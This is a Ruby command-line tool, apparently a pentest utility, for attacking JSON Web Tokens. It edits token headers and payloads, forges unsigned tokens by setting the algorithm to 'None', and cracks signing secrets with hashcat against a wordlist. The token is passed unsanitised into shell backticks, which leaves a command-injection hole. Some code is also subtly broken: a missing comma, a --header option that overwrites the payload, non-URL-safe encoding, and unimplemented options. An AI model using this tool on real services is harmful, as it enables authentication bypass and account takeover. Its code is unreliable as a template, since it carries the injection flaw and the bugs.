#!/usr/bin/env ruby
require 'base64'
require 'optparse'
require 'json'

def banner()
	print "						github.com/NioZow".yellow
	puts %q"
  __   __    __  _____          ___  _                           
  \ \ / / /\ \ \/__   \ ___    / _ \| |  __ _  _   _   ___  _ __ 
   \ \\ \/  \/ /  / /\// __|  / /_)/| | / _` || | | | / _ \| '__|
/\_/ / \  /\  /  / /   \__ \ / ___/ | || (_| || |_| ||  __/| |   
\___/   \/  \/   \/    |___/ \/     |_| \__,_| \__, | \___||_|   
                                               |___/          
".red
	puts "Just playing with some tokens\n".yellow
end


class String
  def red; colorize(self, "\e[1m\e[31m"); end
  def green; colorize(self, "\e[1m\e[32m"); end
  def dark_green; colorize(self, "\e[32m"); end
  def yellow; colorize(self, "\e[1m\e[33m"); end
  def blue; colorize(self, "\e[1m\e[34m"); end
  def dark_blue; colorize(self, "\e[34m"); end
  def purple; colorize(self, "\e[35m"); end
  def dark_purple; colorize(self, "\e[1;35m"); end
  def cyan; colorize(self, "\e[1;36m"); end
  def dark_cyan; colorize(self, "\e[36m"); end
  def pure; colorize(self, "\e[0m\e[28m"); end
  def bold; colorize(self, "\e[1m"); end
  def colorize(text, color_code) "#{color_code}#{text}\e[0m" end
end

def jwt_format(jwt)
	header_encoded, payload_encoded, signature_encoded = jwt.split(".")
  return {:header_encoded => header_encoded, :payload_encoded => payload_encoded, :signature_encoded => signature_encoded, :header_decoded => Base64.decode64(header_encoded), :payload_decoded => Base64.decode64(payload_encoded)}
end

def view(jwt)
  puts "Header: ".yellow + jwt[:header_decoded]
  puts "Payload: ".yellow + jwt[:payload_decoded]
  puts "Signature: ".yellow + jwt[:signature_encoded].to_s
end

def check_validity(jwt) return jwt.count(".") == 2 end

def edit(jwt)
  print "Edit header " + jwt[:header_decoded].yellow + " [y/N]: "
  answer = STDIN.gets.chomp()

  if ["yes", "y", "Y," "YES", "yeah", "YEAH"].include? answer
    print "New header: "
    jwt[:header_decoded] = STDIN.gets.chomp()
    jwt[:header_encoded] = (Base64.encode64 jwt[:header_decoded]).delete("\n")
  end

  print "Edit payload " + jwt[:payload_decoded].yellow + " [y/N]: "
  answer = STDIN.gets.chomp()

  if ["yes", "y", "Y," "YES", "yeah", "YEAH"].include? answer
    print "New payload: "
    jwt[:payload_decoded] = STDIN.gets.chomp()
    jwt[:payload_encoded] = (Base64.encode64 jwt[:payload_decoded]).delete("\n")
  end
  puts "New token: ".yellow + "#{jwt[:header_encoded]}.#{jwt[:payload_encoded]}.#{jwt[:signature_encoded]}"
end

def algorithm_2_none(jwt, none)
  none = "None" if none == true

  header_decoded = JSON.parse(jwt[:header_decoded])
  header_decoded['alg'] = none
  jwt[:header_decoded] = header_decoded.to_json
  jwt[:header_encoded] = (Base64.encode64 jwt[:header_decoded]).delete("\n")

  print "Edit payload " + jwt[:payload_decoded].yellow + " [y/N]: "
  answer = STDIN.gets.chomp()

  if ["yes", "y", "Y," "YES", "yeah", "YEAH"].include? answer
    print "New payload: "
    jwt[:payload_decoded] = STDIN.gets.chomp()
    jwt[:payload_encoded] = (Base64.encode64 jwt[:payload_decoded]).delete("\n")
  end 

  puts "New token: ".yellow + "#{jwt[:header_encoded]}.#{jwt[:payload_encoded]}."
end


def hashcat(jwt)
  jwt_format = "#{jwt[:header_encoded]}.#{jwt[:payload_encoded]}.#{jwt[:signature_encoded]}"
  
  unless File.exist? "/usr/share/wordlists/jwt.secrets.list"
    puts "/usr/share/wordlists/jwt.secrets.list doesn't exist aborting!".red
    exit
  end

  puts "Attempting to crack the secret using hashcat".yellow
  hashcat = `hashcat -a 0 -m 16500 #{jwt_format} /usr/share/wordlists/jwt.secrets.list`
  result = `hashcat -a 0 -m 16500 #{jwt_format} --show |grep ":" | cut -d ":" -f 2`
  if result.length > 0
    puts "Secret found: ".yellow + "#{result}"
  else
    puts "The secret was not found.".red
  end
end

def main()
	banner

	jwt, options = ARGV[0], {}

  OptionParser.new do |opt|
    opt.on('-v', '--view') { |o| options[:view] = o}
    opt.on('-e', '--edit') { |o| options[:edit] = o}
    opt.on('-n None', '--none None') { |o| options[:none] = o}
    opt.on('--header HEADER'){ |o| options[:header] = o}
    opt.on('--hashcat'){ |o| options[:hashcat] = o}
    opt.on('-c URL', '--check URL') {|o| options[:check] = o}
    opt.on('-s SECRET', '--sign SECRET') {|o| options[:sign] = o}
  end.parse!

	unless check_validity(jwt)
		puts "Invalid jwt format!".red
		exit
	end

  jwt = jwt_format jwt

  if options[:header]
    jwt[:payload_decoded] = options[:header]
    jwt[:payload_encoded] = Base64.encode64 jwt[:header_decoded]
  end

  if options[:view]
    view jwt
  elsif options[:edit]
    edit jwt
  elsif options[:none]
    algorithm_2_none(jwt, options[:none])
  elsif options[:hashcat]
    hashcat jwt if options[:header] == nil
  end
end

main